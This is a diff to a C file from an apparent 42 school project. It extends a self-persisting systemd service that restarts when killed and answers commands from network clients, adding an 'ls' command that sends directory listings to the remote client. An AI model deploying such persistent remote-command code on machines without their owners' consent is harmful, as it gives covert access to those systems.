@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/04/18 15:18:30 by mbatty            #+#    #+#             */
-/*   Updated: 2026/05/23 18:00:43 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/05/23 18:07:32 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -21,6 +21,21 @@
 #include <sys/file.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <dirent.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <pwd.h>
+#include <sys/types.h>
+#include <grp.h>
+#include <sys/types.h>
+#include <sys/xattr.h>
+#include <time.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdbool.h>
 
 /*
 	Setup program as a systemd service, it will restart when host reboots and when it is killed
@@ -242,6 +257,33 @@ int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 		munmap(ptr, size);
 		close(file);
 	}
+	else if (!strcmp(msg, "ls"))
+	{
+		DIR				*dir;
+		struct dirent	*dirent;
+
+		dirent = NULL;
+		dir = opendir(".");
+		if (!dir)
+		{
+			server_send_to_id(&ctx->server, client->id, "failed to open dir \".\"??? wtf\n");
+			// cannot open
+			return (0);
+		}
+
+		do
+		{
+			dirent = readdir(dir);
+			if (dirent)
+			{
+				server_send_to_id(&ctx->server, client->id, dirent->d_name);
+				server_send_to_id(&ctx->server, client->id, " ");
+			}
+		}
+		while (dirent);
+		closedir(dir);
+		server_send_to_id(&ctx->server, client->id, "\n");
+	}
 	else
 		server_send_to_id(&ctx->server, client->id, RGB(255,0,0)INVALID_COMMAND CLR);
 _prompt:
@@ -291,5 +333,7 @@ int	run_service(const char *bin_path)
 
 	unlock_lock(&ctx, ctx.super_user ? SUPER_USER_LOCK_FILE : WEAK_LOCK_FILE);
 
-	return (system(SERVICE_RESTART), 0);
+	if (ctx.super_user)
+		system(SERVICE_RESTART);
+	return (0);
 }
